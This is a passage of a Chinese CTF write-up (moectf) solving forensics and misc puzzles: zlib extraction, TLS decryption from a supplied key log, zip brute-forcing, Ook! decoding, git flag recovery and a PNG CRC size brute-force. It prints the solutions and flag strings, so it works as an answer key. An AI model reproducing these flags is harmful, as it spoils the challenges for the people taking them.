<p>打开010手动提取出最后一块数据之后保存，并用zlib解压缩：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\OneDrive\\Desktop\\无标题2&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    compressed = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decompressed = zlib.decompress(compressed)</span><br><span class="line">    <span class="built_in">print</span>(decompressed[-<span class="number">200</span>:])  <span class="comment"># 查看末尾 200 字节</span></span><br><span class="line"><span class="keyword">except</span> zlib.error <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解压失败:&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="encrypted-pdf"><a href="#encrypted-pdf" class="headerlink" title="encrypted_pdf"></a><strong>encrypted_pdf</strong></h3><p>pdf被加密了，网上直接解密网站：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816192604657.png" alt="image-20250816192604657"></p>
<p>hint提示和签到题的方式一样，于是：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816192529395.png" alt="image-20250816192529395"></p>
<h3 id="ez-ssl"><a href="#ez-ssl" class="headerlink" title="ez_ssl"></a><strong>ez_ssl</strong></h3><p>附件是一个TLS加密流量包，找到密钥文件ssl.log:<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214224669.png" alt="image-20250816214224669"></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CLIENT_RANDOM <span class="number">5</span><span class="keyword">cc</span><span class="number">9</span>d<span class="number">58e7</span>bf<span class="number">7268</span><span class="keyword">c</span><span class="number">8</span><span class="keyword">c</span><span class="number">7</span>ca<span class="number">13915</span>b<span class="number">43530206</span>bc<span class="number">57523</span>a<span class="number">3</span>dc<span class="number">06420</span>f<span class="number">47291081</span>bf<span class="number">70</span> <span class="number">3318</span>cf<span class="number">82</span>ad<span class="number">502316</span>bfa<span class="number">204</span>be<span class="number">096</span>be<span class="number">19</span>f<span class="number">297</span>b<span class="number">0e5</span>f<span class="number">680</span>d<span class="number">81e462</span><span class="keyword">c</span><span class="number">39</span>d<span class="number">0</span>af<span class="number">53</span>ab<span class="number">67</span>b<span class="number">82</span>d<span class="number">0e11</span>b<span class="number">54</span>db<span class="number">16</span>dae<span class="number">81394</span>cd<span class="number">9e9816</span>e<span class="number">4</span></span><br><span class="line">CLIENT_RANDOM <span class="number">523878</span>d<span class="number">7689e894823485</span>b<span class="number">8</span>f<span class="number">32727</span><span class="keyword">c</span><span class="number">779</span>f<span class="number">8605866423</span>eab<span class="number">6</span>f<span class="number">4</span><span class="keyword">cc</span><span class="number">16</span><span class="keyword">c</span><span class="number">9</span>df<span class="number">1</span>cfb<span class="number">33</span> <span class="number">3318</span>cf<span class="number">82</span>ad<span class="number">502316</span>bfa<span class="number">204</span>be<span class="number">096</span>be<span class="number">19</span>f<span class="number">297</span>b<span class="number">0e5</span>f<span class="number">680</span>d<span class="number">81e462</span><span class="keyword">c</span><span class="number">39</span>d<span class="number">0</span>af<span class="number">53</span>ab<span class="number">67</span>b<span class="number">82</span>d<span class="number">0e11</span>b<span class="number">54</span>db<span class="number">16</span>dae<span class="number">81394</span>cd<span class="number">9e9816</span>e<span class="number">4</span></span><br><span class="line">CLIENT_RANDOM ccfba<span class="number">4</span>dd<span class="number">12e374</span>afd<span class="number">300</span>f<span class="number">296</span>b<span class="number">691e12</span>b<span class="number">70</span>f<span class="number">9</span>d<span class="number">5</span>f<span class="number">8</span>be<span class="number">0458782887763</span><span class="keyword">c</span><span class="number">8</span>a<span class="number">54626</span>e <span class="number">3318</span>cf<span class="number">82</span>ad<span class="number">502316</span>bfa<span class="number">204</span>be<span class="number">096</span>be<span class="number">19</span>f<span class="number">297</span>b<span class="number">0e5</span>f<span class="number">680</span>d<span class="number">81e462</span><span class="keyword">c</span><span class="number">39</span>d<span class="number">0</span>af<span class="number">53</span>ab<span class="number">67</span>b<span class="number">82</span>d<span class="number">0e11</span>b<span class="number">54</span>db<span class="number">16</span>dae<span class="number">81394</span>cd<span class="number">9e9816</span>e<span class="number">4</span></span><br><span class="line">CLIENT_RANDOM <span class="keyword">c</span><span class="number">8e817</span>f<span class="number">2</span>efcee<span class="number">3</span>be<span class="number">9290</span>aa<span class="number">075919</span>f<span class="number">50</span>f<span class="number">329</span>be<span class="number">997</span>b<span class="number">124487</span>d<span class="number">02</span>a<span class="number">1850e48</span><span class="keyword">c</span><span class="number">4292</span>d <span class="number">3318</span>cf<span class="number">82</span>ad<span class="number">502316</span>bfa<span class="number">204</span>be<span class="number">096</span>be<span class="number">19</span>f<span class="number">297</span>b<span class="number">0e5</span>f<span class="number">680</span>d<span class="number">81e462</span><span class="keyword">c</span><span class="number">39</span>d<span class="number">0</span>af<span class="number">53</span>ab<span class="number">67</span>b<span class="number">82</span>d<span class="number">0e11</span>b<span class="number">54</span>db<span class="number">16</span>dae<span class="number">81394</span>cd<span class="number">9e9816</span>e<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>保存后解密便可以提取出flag.zip,发现有加密，且非伪加密。</p>
<p>用winrar打开之后发现又压缩包注释：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214602128.png" alt="image-20250816214602128">（很诡异)</p>
<p>爆破：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214627559.png" alt="image-20250816214627559"></p>
<p>打开之后：</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure>

<p>ook加密，在线网站：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
<p>解密得到：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214757580.png" alt="image-20250816214757580"></p>
<p>flag为：<code>moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;</code></p>
<h3 id="WebRepo"><a href="#WebRepo" class="headerlink" title="WebRepo"></a><strong>WebRepo</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Lenovo@ya7q MINGW64 /d/OneDrive/Desktop/flag/repo (master)</span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit 249ff41401736165cd4514cee7afcd31ecfe7d09 (HEAD -&gt; master)</span><br><span class="line">Author: <span class="built_in">test</span> &lt;<span class="built_in">test</span>@example.com&gt;</span><br><span class="line">Date:   Tue Aug 19 22:33:29 2025 +0800</span><br><span class="line"></span><br><span class="line">    flag</span><br><span class="line">Lenovo@ya7q MINGW64 /d/OneDrive/Desktop/flag/repo (master)</span><br><span class="line">$ git ls-tree -r --name-only 249ff414</span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line">Lenovo@ya7q MINGW64 /d/OneDrive/Desktop/flag/repo (master)</span><br><span class="line">$ git show 249ff414:flag.txt</span><br><span class="line">moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;</span><br><span class="line"></span><br><span class="line">Lenovo@ya7q MINGW64 /d/OneDrive/Desktop/flag/repo (master)</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="weird-photo"><a href="#weird-photo" class="headerlink" title="weird_photo"></a><strong>weird_photo</strong></h3><p>CRC爆破：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;D:/OneDrive/DeskTop/photo.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     <span class="comment">#读取图片中的CRC校验值</span></span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                        <span class="comment">#宽度1-4000进行枚举</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                    <span class="comment">#高度1-4000进行枚举</span></span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">#print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):            <span class="comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<h2 id="哈基米难没露躲"><a href="#哈基米难没露躲" class="headerlink" title="哈基米难没露躲"></a>哈基米难没露躲</h2><p>附件文本：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。窝那没撸多吉豆没米奶压哈基米，哈基米多那吉豆没米吉哈基米？奈诺娜美嘎豆没咕吉豆窝那没撸多，南北绿豆没咕吉豆没咕吉窝那没撸多，窝那没撸多豆没咕吉哦吗吉利；南北绿豆豆没咕吉豆没米窝那没撸多；南北绿豆吉豆耶咕吉豆椰奶龙。哈基米没米吉豆哈基米？库路曼波耶吗多奈哪买噶哈基米。哦吗吉利奈哪买噶奈哪阿西噶压；南北绿豆买噶奈哪窝那没撸多；阿西噶压买噶奈哪买阿西噶压；哈基米娜多多压那窝那没撸多？欧莫季里奈哪买北多奈诺娜美嘎；哦吗吉利多压那呀里欧西库路曼波。窝那没撸多奈哪买噶奈哈基米；南北绿豆哪买噶奈哪哦吗吉利，欧莫季里买噶奈哪买噶奈库路曼波，库路曼波哪买噶多多压那库路曼波。哈基米奈哪买噶奈哪买南北绿豆？椰奶龙娜奈哪买哈基米，窝那没撸多噶奈哪买奈诺娜美嘎？阿西噶压噶奈哪买噶奈哪哈基米，阿西噶压买噶奈哪买娜奈奈诺娜美嘎。奈诺娜美嘎哪买北奈哪买噶椰奶龙？哦吗吉利奈哪买北奈诺娜美嘎，窝那没撸多奈哪买噶奈哪窝那没撸多？阿西噶压买噶奈哪买噶奈欧莫季里。库路曼波哪买噶奈哈基米？阿西噶压哪买噶多多压那阿西噶压。窝那没撸多奈哪买北奈哪买阿西噶压；库路曼波噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶奈哈基米；椰奶龙哪买噶奈哪买哦吗吉利；南北绿豆噶奈哪买哈基米；哈基米噶多多压那奈诺娜美嘎？窝那没撸多奈哪买北奈哦吗吉利，库路曼波哪买娜奈椰奶龙。哈基米哪买噶奈哪欧莫季里？椰奶龙买噶奈哪买噶阿西噶压。哈基米奈哪买噶奈奈诺娜美嘎？欧莫季里哪买噶多多压那哦吗吉利，阿西噶压奈哪买娜奈哪买哦吗吉利，南北绿豆娜奈哪买噶奈哪哈基米；库路曼波买噶奈哪买窝那没撸多。哈基米噶奈哪买南北绿豆；椰奶龙噶奈哪买噶多多窝那没撸多，阿西噶压压那奈哪买椰奶龙，欧莫季里娜奈哪买奈诺娜美嘎，阿西噶压北奈哪买噶奈哪库路曼波。库路曼波买噶奈哪买噶奈阿西噶压？哈基米哪买噶奈南北绿豆，南北绿豆哪买娜奈哪买哈基米；哦吗吉利北奈哪买噶奈椰奶龙，库路曼波哪买北奈窝那没撸多，阿西噶压哪买噶奈哪买奈诺娜美嘎；奈诺娜美嘎噶奈哪买噶奈欧莫季里，阿西噶压哪买噶奈哪窝那没撸多。南北绿豆买噶多多阿西噶压，窝那没撸多压那奈哪阿西噶压？椰奶龙买北奈哪奈诺娜美嘎；窝那没撸多买娜奈哪买噶奈椰奶龙？哦吗吉利哪买噶奈阿西噶压。哈基米哪买噶奈哪窝那没撸多；库路曼波买噶奈哪买噶奈欧莫季里。南北绿豆哪买北多多压那窝那没撸多；欧莫季里奈哪买娜奈哪买奈诺娜美嘎；椰奶龙噶奈哪买噶窝那没撸多，奈诺娜美嘎奈哪买噶奈阿西噶压；阿西噶压哪买噶奈哪买娜阿西噶压；椰奶龙奈哪买北奈欧莫季里。奈诺娜美嘎哪买噶奈阿西噶压，椰奶龙哪买娜奈哪买欧莫季里？库路曼波噶奈哪买库路曼波。阿西噶压噶奈哪买噶窝那没撸多；窝那没撸多奈哪买噶奈哪买南北绿豆？阿西噶压噶多多压那椰奶龙，库路曼波奈哪买娜哈基米；窝那没撸多奈哪买噶阿西噶压，库路曼波喔酷娜利步啊那窝那没撸多？南北绿豆吉豆没咕吉豆欧莫季里；欧莫季里没咕吉豆没南北绿豆？库路曼波咕吉豆没咕库路曼波。哈基米吉豆没咕哦吗吉利？哈基米奶压多那吉豆库路曼波，库路曼波没咕吉豆耶咕阿西噶压，椰奶龙吉豆没咕吉豆没窝那没撸多？阿西噶压咕吉豆没咕欧莫季里。奈诺娜美嘎吉豆没咕吉豆哈基米？欧莫季里没咕奶压多那吉库路曼波；阿西噶压豆没咕奶椰奶龙；奈诺娜美嘎压多那吉南北绿豆，窝那没撸多豆没咕吉欧莫季里；南北绿豆豆没咕吉豆奈诺娜美嘎。库路曼波没咕吉豆奈诺娜美嘎，南北绿豆没咕吉豆没咕吉窝那没撸多？库路曼波豆耶咕奶压多阿西噶压，哈基米那吉豆没米吉豆窝那没撸多；哈基米没咕吉豆没咕吉南北绿豆？奈诺娜美嘎豆没咕吉豆没奈诺娜美嘎；南北绿豆咕吉豆没南北绿豆。奈诺娜美嘎咕奶压多那吉奈诺娜美嘎？南北绿豆豆没米吉椰奶龙；椰奶龙豆没咕吉豆没窝那没撸多？欧莫季里咕吉豆没咕吉豆库路曼波；欧莫季里没咕吉豆没咕南北绿豆？奈诺娜美嘎吉豆没咕奶窝那没撸多；南北绿豆压多那吉豆没咕哈基米？欧莫季里吉豆没米吉豆欧莫季里；阿西噶压没咕吉豆奈诺娜美嘎；阿西噶压没咕吉豆没咕吉椰奶龙，哈基米豆没咕吉豆没阿西噶压？南北绿豆咕奶压多那椰奶龙。欧莫季里吉豆没咕吉豆没库路曼波；哈基米吗喵子路路吉阿西噶压，窝那没撸多豆没咕吉豆哦吗吉利；南北绿豆没咕吉豆阿西噶压？阿西噶压没咕吉豆没南北绿豆；哈基米咕吉豆没咕窝那没撸多；阿西噶压奶压多那吉椰奶龙；库路曼波豆没咕吉豆没米阿西噶压，奈诺娜美嘎吉豆没咕吉窝那没撸多。阿西噶压豆没咕吉窝那没撸多，阿西噶压豆没咕吉豆欧莫季里？库路曼波没咕吉豆没窝那没撸多，库路曼波咕吉豆耶咕奶压窝那没撸多？哦吗吉利多那吉豆没米阿西噶压。哈基米吉豆没咕吉欧莫季里；南北绿豆豆没咕吉欧莫季里。南北绿豆豆没咕吉豆没咕南北绿豆？椰奶龙吉豆没米吉豆椰奶龙；库路曼波耶咕吉豆没阿西噶压？欧莫季里咕吉豆没米南北绿豆；南北绿豆吉豆没咕吉豆没哈基米；哦吗吉利咕吉豆没咕吉奈诺娜美嘎？窝那没撸多豆没咕吉豆库路曼波，库路曼波没咕奶压多那吉阿西噶压。窝那没撸多豆没咕吉豆库路曼波？阿西噶压没西一奈哪买噶阿西噶压；哦吗吉利奈哪买噶哦吗吉利；椰奶龙奈哪买噶奈南北绿豆，库路曼波哪买噶奈哪买娜库路曼波，哈基米奈哪买北奈哪买窝那没撸多。欧莫季里噶奈哪买北奈哈基米，椰奶龙哪买噶奈库路曼波？南北绿豆哪买噶奈欧莫季里；哈基米哪买噶奈椰奶龙，奈诺娜美嘎哪买噶奈哪南北绿豆，库路曼波买娜奈哪哦吗吉利？阿西噶压买北奈哪买娜奈库路曼波。欧莫季里哪买噶奈欧莫季里，库路曼波哪买噶奈哪买欧莫季里？库路曼波噶奈哪买噶奈窝那没撸多；阿西噶压哪买噶奈阿西噶压；窝那没撸多哪买噶奈哪买北南北绿豆。库路曼